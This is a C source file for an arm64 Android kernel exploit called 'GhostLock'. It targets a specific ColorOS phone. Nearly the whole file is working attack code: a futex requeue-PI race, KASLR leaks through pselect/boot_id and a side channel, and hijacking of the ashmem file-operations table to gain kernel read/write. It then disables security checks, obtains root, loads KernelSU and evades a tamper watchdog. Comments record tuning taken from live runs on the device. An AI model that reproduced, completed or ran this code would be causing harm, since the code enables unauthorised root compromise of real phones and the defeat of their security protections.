#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        int consumer_nice = PSELECT_CONSUMER_NICE;
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        /* JoinChang: if sched_setattr fails, FUTEX_LOCK_PI still walks PI. */
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  /* Custom-write route uses delay=0; keep short settle before requeue. */
  usleep(20000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(2000);
  }
}



int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_unbuffer();
  write(STDOUT_FILENO, "EXPLOIT_START\n", 14);
  log_startup_context();
  write(STDOUT_FILENO, "POST_LOG_STARTUP\n", 18);
  init_ashmem_path();
  write(STDOUT_FILENO, "POST_INIT_ASHMEM\n", 18);
  pin_to_core(CORE);
  write(STDOUT_FILENO, "POST_PIN_CORE\n", 15);

  /*
   * PRIMARY = a.so chain:
   *   1) slide_leak_kernel_base → GhostLock pselect/boot_id → real KIMAGE
   *      (perf IP-sampling removed 2026-08-19: shell has no CAP_PERFMON)
   *   2) prepare FOPS page → run_main_route_threads (CFI)
   *   3) install_pipe_physrw → secureguard neutralize → UMH root
   * Other:
   *   GHOSTLOCK_SLIDE_ONLY=1 (leak experiment only)
   */
  {
    char *slide_only = getenv("GHOSTLOCK_SLIDE_ONLY");
    if (slide_only && slide_only[0] == '1') {
      pr_info("SLIDE_ONLY mode: boot_id writeback experiment\n");
      if (!slide_leak_kernel_base()) {
        pr_error("SLIDE_ONLY: leak/stages failed\n");
        return 1;
      }
      pr_success("SLIDE_ONLY: done kaslr_done=%d base=%016zx slide=%016zx\n",
                 kaslr_done, kaslr_base, kaslr_slide);
      return kaslr_done ? 0 : 2;
    }
  }

  /*
   * ARM64 PRFM timing scan REMOVED 2026-08-19: PRFM is an async hint —
   * single-instruction timing is always 0 ticks on this SoC (live-proven
   * avg=0 clear=0), the approach is architecturally dead. See
   * exploit-backup-20260819 for the old code.
   */

  /*
   * Side-channel probe only (KernelSnitch heap pointer / pipe page).
   * EntryBleed is x86/Intel; this device is arm64 Qualcomm.
   * KS returns physmap DPM addresses (0xffffff80…), NOT text KIMAGE.
   * No FOPS/root; kill prepare child and exit.
   */
  {
    char *ks_only = getenv("GHOSTLOCK_KERNELSNITCH_ONLY");
    if (ks_only && ks_only[0] == '1') {
      pr_info("KERNELSNITCH_ONLY: side-channel mm/pipe page leak (no root)\n");
      fsync(STDERR_FILENO);
      uintptr_t base = prepare_pipe_buffer_page();
      /* cleanup_kernelsnitch() already ran inside prepare; do not touch ks. */
      int is_p0 = base && ((base & 0xfffffff000000000ULL) == 0xffffff8000000000ULL);
      int is_kimg =
          base && ((base >> 48) == 0xffff) &&
          ((base & 0xfffffff000000000ULL) != 0xffffff8000000000ULL);
      dprintf(STDERR_FILENO,
              "[*] KERNELSNITCH_ONLY page_base=%016zx is_physmap=%d is_kimage=%d\n",
              base, is_p0, is_kimg);
      fsync(STDERR_FILENO);
      if (pipe_prepare_child > 0) {
        kill(pipe_prepare_child, SIGKILL);
        waitpid(pipe_prepare_child, NULL, 0);
        pipe_prepare_child = -1;
      }
      if (!base || base == (uintptr_t)-1) {
        pr_error("KERNELSNITCH_ONLY: leak failed\n");
        return 4;
      }
      if (is_p0) {
        pr_success("KERNELSNITCH_ONLY: physmap heap page OK (not text KIMAGE)\n");
        return 0;
      }
      pr_warning("KERNELSNITCH_ONLY: unexpected address class\n");
      return 2;
    }
  }

  /*
   * KASLR / pointer leak: pselect + boot_id ONLY (perf path removed
   * 2026-08-19 — GHOSTLOCK_PERF_ONLY / GHOSTLOCK_USE_PERF are no longer
   * read anywhere).
   * Leak-only (print boot_id ptr, exit): GHOSTLOCK_BOOT_ID_LEAK_ONLY=1.
   * Force base (root oracle / same-boot only):
   *   GHOSTLOCK_FORCE_KASLR_BASE=0xffffffc0........  (_stext from kallsyms)
   */
  {
    char *force_base = getenv("GHOSTLOCK_FORCE_KASLR_BASE");
    if (force_base && force_base[0]) {
      char *end = NULL;
      unsigned long long tb = strtoull(force_base, &end, 0);
      if (end != force_base && tb && apply_kimage_base((uint64_t)tb)) {
        pr_success("FORCE_KASLR_BASE applied base=%016zx slide=%016zx "
                   "(same-boot only; do not reuse across reboot)\n",
                   kaslr_base, kaslr_slide);
        /*
         * Safer defaults under FORCE (oracle path): single attempt unless
         * operator overrides. Avoid 3–24 retries that multi-panic a phone.
         * Ladder: FOPS_DRYRUN=1 → FOPS_SKIP_CFI=1 → full CFI.
         */
        if (!getenv("GHOSTLOCK_FOPS_MAX_ATTEMPTS")) {
          setenv("GHOSTLOCK_FOPS_MAX_ATTEMPTS", "1", 0);
          pr_info("FORCE: default GHOSTLOCK_FOPS_MAX_ATTEMPTS=1\n");
        }
        /* custom FOPS: delay must stay 0 (50ms reboots on PKJ110). */
        if (!getenv("PSELECT_ROUTE_DELAY_USEC")) {
          setenv("PSELECT_ROUTE_DELAY_USEC", "0", 0);
          pr_info("FORCE: default PSELECT_ROUTE_DELAY_USEC=0 (custom-safe)\n");
        }
        fsync(STDERR_FILENO);
        goto aso_after_kaslr;
      }
      pr_error("FORCE_KASLR_BASE invalid or apply failed: %s\n", force_base);
      return 3;
    }
  }

  /*
   * FOPS PI topology test WITHOUT KIMAGE / without root:
   * prepare FOPS page (handlers zeroed when kaslr_done=0), run main route
   * with SKIP_CFI. Proves parent-store hijack of ashmem_misc.fops survives.
   * Does NOT call through fake_fops text (no try_cfi).
   */
  {
    char *pi_only = getenv("GHOSTLOCK_FOPS_PI_ONLY");
    if (pi_only && pi_only[0] == '1') {
      /*
       * Audit SANITY3 template (device-alive):
       *   PAGE_PAYLOAD_SLIDE + main_route + stack mode=1 left-write
       * Default: *misc.fops = page_base|color
       * TARGET=bootid: boot_id←loggers
       * TARGET=fops:   *misc.fops = fake_fops (zero leaf region on slide page)
       */
      pr_info("FOPS_PI_ONLY: SLIDE page + stack left-write (SANITY3 class)\n");
      fsync(STDERR_FILENO);
      kaslr_done = 0;
      setenv("GHOSTLOCK_FOPS_SKIP_CFI", "1", 1);
      if (!getenv("GHOSTLOCK_FOPS_MAX_ATTEMPTS"))
        setenv("GHOSTLOCK_FOPS_MAX_ATTEMPTS", "1", 0);
      if (!getenv("PSELECT_ROUTE_DELAY_USEC"))
        setenv("PSELECT_ROUTE_DELAY_USEC", "0", 0);

      pin_to_core(CORE);
      clear_pselect_write();
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
      if (!page_base || !fake_task || !fake_lock) {
        pr_error("FOPS_PI_ONLY: page prepare failed\n");
        return 1;
      }
      fake_fops = page_base + FOPS_TABLE_OFF; /* zero from skb memset */

      pselect_child_node = 0;
      {
        char *tgt = getenv("GHOSTLOCK_FOPS_PI_TARGET");
        uintptr_t target = data_addr(ASHMEM_MISC_FOPS);
        uintptr_t parent_val = page_base;
        if (tgt && (tgt[0] == 'b' || tgt[0] == 'B')) {
          target = SLIDE_RANDOM_BOOT_ID_DATA;
          parent_val = SLIDE_LOGGERS_0_1;
          pr_info("FOPS_PI_ONLY: TARGET=bootid left=boot_id parent=loggers\n");
        } else if (tgt && (tgt[0] == 'f' || tgt[0] == 'F')) {
          parent_val = fake_fops;
          pr_info("FOPS_PI_ONLY: TARGET=fops left=misc.fops parent=fake_fops\n");
        } else {
          pr_info("FOPS_PI_ONLY: TARGET=misc left=misc.fops parent=page_base\n");
        }
        set_pselect_write_mode(target, parent_val, 1);
        pr_info("FOPS_PI_ONLY: mode=1 left=%016zx parent=%016zx page=%016zx "
                "fake_fops=%016zx task=%016zx\n",
                target, parent_val, page_base, fake_fops, fake_task);
      }
      fsync(STDERR_FILENO);
      run_main_route_threads();
      clear_pselect_write();
      pr_success("FOPS_PI_ONLY done cfi_step=%d consumer_success=%d "
                 "(alive if you see this)\n",
                 cfi_last_step, atomic_load(&consumer_success));
      fsync(STDERR_FILENO);
      return (cfi_last_step == 0 && atomic_load(&consumer_success) > 0) ? 0 : 2;
    }
  }

  {
    char *boot_only = getenv("GHOSTLOCK_BOOT_ID_LEAK_ONLY");
    if (boot_only && boot_only[0] == '1') {
      pr_info("BOOT_ID_LEAK_ONLY: pselect/GhostLock → boot_id kernel ptr "
              "(no perf, no FOPS/root)\n");
      fsync(STDERR_FILENO);
      boot_id_leaked_ptr = 0;
      boot_id_leak_is_kimage = 0;
      boot_id_leak_is_physmap = 0;
      if (!slide_leak_kernel_base()) {
        pr_error("BOOT_ID_LEAK_ONLY: slide stages failed\n");
        return 1;
      }
      if (!boot_id_leaked_ptr) {
        pr_error("BOOT_ID_LEAK_ONLY: no kernel ptr in boot_id\n");
        return 2;
      }
      pr_success("BOOT_ID_LEAK_ONLY OK ptr=%016llx kimage=%d physmap=%d "
                 "kaslr_done=%d base=%016zx\n",
                 (unsigned long long)boot_id_leaked_ptr, boot_id_leak_is_kimage,
                 boot_id_leak_is_physmap, kaslr_done, kaslr_base);
      kimage_chain_probe();
      return 0;
    }
  }

  /*
   * a.so STAGE 3 order (ASO_完整攻击流程分析.md §4.1) — (no selinux write; UMH does a 1-byte permissive write after physrw):
   *   slide_leak_kernel_base()  GhostLock → boot_id parent ptr → KASLR
   * (perf_event_open IP-sampling REMOVED 2026-08-19: PKJ110 shell has no
   *  CAP_PERFMON → always EACCES; it never once succeeded.)
   REMOVED_SENTINEL_→ context=? / app crash).
   */
  pr_success("【1/7 KASLR泄漏】开始\n");
  fsync(STDERR_FILENO);

  if (!kaslr_done) {
    kaslr_done = 0;
    kaslr_base = 0;
    kaslr_slide = 0;
    boot_id_leaked_ptr = 0;
    boot_id_leak_is_kimage = 0;
    boot_id_leak_is_physmap = 0;

        fsync(STDERR_FILENO);
    if (!slide_leak_kernel_base()) {
      pr_error("【失败 1/7 KASLR泄漏】pselect/boot_id 泄漏失败\n");
      return 3;
    }
    if (!kaslr_done) {
      pr_error("【失败 1/7 KASLR泄漏】未取得 KIMAGE 基址\n");
      kimage_chain_probe();
      return 3;
    }
    pr_success("【1/7 KASLR泄漏】成功\n");
    fsync(STDERR_FILENO);
  }

  if (!kaslr_done) {
    pr_error("【失败】kaslr_done=0\n");
    return 3;
  }

aso_after_kaslr:
  pin_to_core(CORE);
  pr_success("【2/7 内核页准备】开始\n");
  fsync(STDERR_FILENO);

  /*
   * Audit fix: abandon classic PAGE FOPS parent-store (device panics).
   * 1) Prefer SLIDE-class page always (SANITY3 survived); FOPS mode only
   *    for handler table when kaslr_done (util no longer arms misc.fops-8).
   * 2) put_fake_fops fills handlers when kaslr_done (leaf-safe head).
   * 3) Stack mode=1: *misc.fops = fake_fops|color
   * 4) custom path skips try_cfi — call try_cfi_stage after clear.
   */
  clear_pselect_write();
  /* FOPS payload now leaf-safe; use it when handlers needed, else SLIDE. */
  page_base = prepare_good_kernel_page(
      kaslr_done ? PAGE_PAYLOAD_FOPS : PAGE_PAYLOAD_SLIDE);
  if (!page_base || !fake_task || !fake_lock) {
    pr_error("【失败 2/7 内核页准备】喷射未回收内核页\n");
    return 1;
  }
  if (!fake_fops)
    fake_fops = page_base + FOPS_TABLE_OFF;

  pr_success("【2/7 内核页准备】成功\n");
  fsync(STDERR_FILENO);

  {
    char *dry = getenv("GHOSTLOCK_FOPS_DRYRUN");
    if (dry && dry[0] == '1') {
      pr_info("【FOPS_DRYRUN】页面就绪，跳过\n");
      return 0;
    }
  }

    /* Stack left-write *ashmem_misc.fops = fake_fops (mode=1). This is the
   * proven ASO FOPS path on PKJ110 (run38: FOPS PI route ok → pipe →
   * root init_tasks_prev). a.so SIMPLE parent-store layout needs its own
   * payload offsets (W0=0x13a0 etc) which we do not share. */
  pselect_child_node = 0;
  set_pselect_write_mode(data_addr(ASHMEM_MISC_FOPS), fake_fops, 1);
  /* Delay policy (facts): root-run-6 custom delay=0 + PI success=1 ALIVE;
   * root-run-25 and run127-131 (5x) custom delay=50000 → REBOOT right after
   * pselect RETURN. fops.c default for custom IS 0 (route ladder applies
   * only to non-custom). Do NOT force 50000 here; operator can still opt
   * in per-run: GHOSTLOCK_CUSTOM_DELAY=1 PSELECT_ROUTE_DELAY_USEC=50000. */
  if (!getenv("GHOSTLOCK_FOPS_MAX_ATTEMPTS"))
    setenv("GHOSTLOCK_FOPS_MAX_ATTEMPTS", "24", 0);

  pr_success("【3/7 FOPS劫持】开始\n");
  fsync(STDERR_FILENO);
  run_main_route_threads();
  clear_pselect_write();

  if (atomic_load(&consumer_success) <= 0) {
    pr_error("【失败 3/7 FOPS劫持】PI 路由未命中 consumer_success=%d cfi_step=%d\n",
             atomic_load(&consumer_success), cfi_last_step);
    return 1;
  }
  pr_success("【3/7 FOPS劫持】成功\n");

  /* custom path skipped try_cfi — run it now (needs kaslr_done handlers) */
  {
    char *sc = getenv("GHOSTLOCK_FOPS_SKIP_CFI");
    if (sc && sc[0] == '1') {
      pr_success("【4/7 CFI验证】跳过\n");
    } else if (!try_cfi_stage()) {
      pr_error("【失败 4/7 CFI验证】step=%d errno=%d\n",
               cfi_last_step, cfi_last_errno);
      /* fall through to summary */
    } else {
      atomic_store(&cfi_stage_done, 1);
    }
  }

  /* SOFT REBOOT (GHOSTLOCK_MAGICA_SOFT_REBOOT=1 only) FIRES HERE — after
   * try_cfi_stage restored + verified the real misc.fops. The parked root
   * child performs the zygote kill; killing earlier (run114) meant every
   * app spawned by the restarting framework opened ashmem through the
   * still-installed fake fops → app crashes. Default is OFF: run116
   * showed the zygote kill escalates to a full reboot (~45s) on this
   * ColorOS build, unloading KSU; clean-artifact runs (run115) stay
   * stable 55+ min with no kill and no tamper trip. */
  if (fire_magica_soft_reboot()) {
    pr_info("【软重启】已触发\n");
  }

  pr_info("【汇总】pid=%d cfi_done=%d kaslr=%d base=%016zx\n",
          getpid(), atomic_load(&cfi_stage_done), kaslr_done, kaslr_base);
  pr_info("【汇总】物理读写 r=%d w=%d rw64=%d/%d\n",
          physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  /* Final verdict aligned with magica semantics: after the zygote soft
   * reboot ColorOS init restores selinux_enforcing to 1, so requiring
   * selinux_after==0 would misreport every successful magica run (run115
   * "incomplete" despite uid=0 + KSU live). Magica success = child got
   * root + magica stages done; plain mode keeps the permissive check.
   * UMH path: the kernel spawns the root sh asynchronously — root_child_done
   * /root_uid_after (cred-patch child only) stay 0, so the verdict consults
   * umh_root_done instead (set by install_child_root on UMH success). */
  if (umh_root_done) {
    pr_success("ROOT 成功\n");
    return 0;
  }
  if (root_child_done && root_uid_after == 0 &&
      (root_magica_done || setenforce_ret == 0)) {
    pr_success("ROOT 成功\n");
    /*
     * Magica jailbreak mode (KernelSU PR #3268) runs inside the root child
     * (spawn_root_child): after setuid(0) the child is full root and
     * performs kernelsu.ko load + (deferred) zygote soft reboot to dodge
     * the ColorOS 15s tamper watchdog. Env knobs:
     *   GHOSTLOCK_MAGICA=1                → enable stages in root child
     *   GHOSTLOCK_MAGICA_PORT=<n>         → adbd tcp port (default 5555)
     *   GHOSTLOCK_MAGICA_MODULE=<path>    → kernelsu.ko path
     *   GHOSTLOCK_MAGICA_ADB=1            → adb-root props (default off)
     *   GHOSTLOCK_EMBED_SU=1              → embedded su (default off)
     *   GHOSTLOCK_WALLPAPER=1             → wallpaper (default off)
     *   GHOSTLOCK_KEEP_MODULE=1           → keep .ko file (default off)
     *   GHOSTLOCK_MAGICA_SOFT_REBOOT=0    → skip soft reboot
     */
    return 0;
  }
  pr_error("ROOT 失败\n");
  return 1;
}
